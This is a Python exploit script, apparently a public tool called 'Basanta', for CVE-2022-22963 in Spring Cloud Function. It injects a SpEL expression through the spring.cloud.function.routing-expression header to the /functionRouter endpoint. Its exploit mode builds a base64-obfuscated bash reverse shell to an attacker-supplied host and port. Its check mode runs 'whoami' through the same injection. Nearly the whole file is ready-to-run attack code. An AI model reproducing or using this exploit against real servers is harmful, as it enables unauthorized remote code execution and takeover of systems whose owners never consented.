import sys
import requests
import base64

def banner_art():

    print('\n \n')
    banner = '''
    888~~\       e      ,d88~~\      e      888b    | ~~~888~~~      e      
    888   |     d8b     8888        d8b     |Y88b   |    888        d8b     
    888 _/     /Y88b    `Y88b      /Y88b    | Y88b  |    888       /Y88b    
    888  \    /  Y88b    `Y88b,   /  Y88b   |  Y88b |    888      /  Y88b   
    888   |  /____Y88b     8888  /____Y88b  |   Y88b|    888     /____Y88b  
    888__/  /      Y88b \__88P' /      Y88b |    Y888    888    /      Y88b 
                                                               
                                                                -by onion   '''


    print(banner)
    print('\n')

class hlp:    
    def general_help():
        print('Basanta is a python script that can detect and exploit CVE-2022-22963.')
        print('Example use:\n \n\tpython3 CVE-2022-22963.py <mode>')
        print('Modes:\n\texploit\n\tcheck\n')
        print('\n-h or --help for help\n')
    def RCE_help():
        print('Example use:\n \n\tpython3 CVE-2022-22963.py exploit <target url> <LHOST> <LPORT> \n')
    def chk_help():
        print('Example use:\n \n\tpython3 CVE-2022-22963.py check <target url>\n')


class exploit:
    def __init__(self, target_url, attacker_ip = None, attacker_port = None):
       self.target = target_url
       self.attacker_ip =  attacker_ip
       self.attacker_port = attacker_port
    
    def payload(self, command = None):
        if command == None:
            cmd ='bash -i >&/dev/tcp/'+self.attacker_ip+'/'+self.attacker_port+' 0>&1'
            cmd = 'bash -c {echo,' + ((str(base64.b64encode(cmd.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
            pld = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
            self.injection(pld, 1)
        else: 
            cmd = command
            cmd = 'bash -c {echo,' + ((str(base64.b64encode(cmd.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
            pld = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
            self.injection(pld, 2)

    def injection(self, payload, mode=None):
        data ='onion'
        header = {'spring.cloud.function.routing-expression':payload}
        path = '/functionRouter'
        target = self.target + path
        req = requests.post(url=target, headers=header, data=data, verify=False, timeout=3)
        code = req.status_code
        text = req.text
        flag = '"error":"Internal Server Error"'
        if mode == 1:
            try:
                if code == 500 and flag in text:
                    print("Exploit successfull!")
                    print("Check your listener")
                else: 
                    print("Exploit failed!")
            except:
                print('Unknown error occured!')
        if mode == 2:
            try:
                if code == 500 and flag in text:
                    print("The target is vulnerable!")
                else: 
                    print("The target is not vulnerable!")
            except:
                print('Unknown error occured!')

if __name__ == '__main__': 
    banner_art()
    args = len(sys.argv)
    if args == 1 or sys.argv[1] == '--help':
        help = hlp.general_help()
    elif args > 1: 
        if sys.argv[1] == 'exploit':
            try:
                if sys.argv[2] in ['help', '--help', '-h']:
                    help = hlp.RCE_help()
                elif args !=5: 
                    print('check the arguments!')
                    help = hlp.RCE_help()
                else:
                    rce_obj = exploit(sys.argv[2],sys.argv[3], sys.argv[4]) 
                    rce_obj.payload()
            except IndexError:
                help = hlp.RCE_help()
        if sys.argv[1] == 'check':
            try:
                if sys.argv[2] in ['help', '--help', '-h']:
                    help = hlp.chk_help()
                elif args != 3:
                    print('check the arguments!')
                    help = hlp.chk_help()
                else:
                    chk_obj = exploit(sys.argv[2])
                    chk_obj.payload(command='whoami')
            except IndexError:
                help = hlp.chk_help()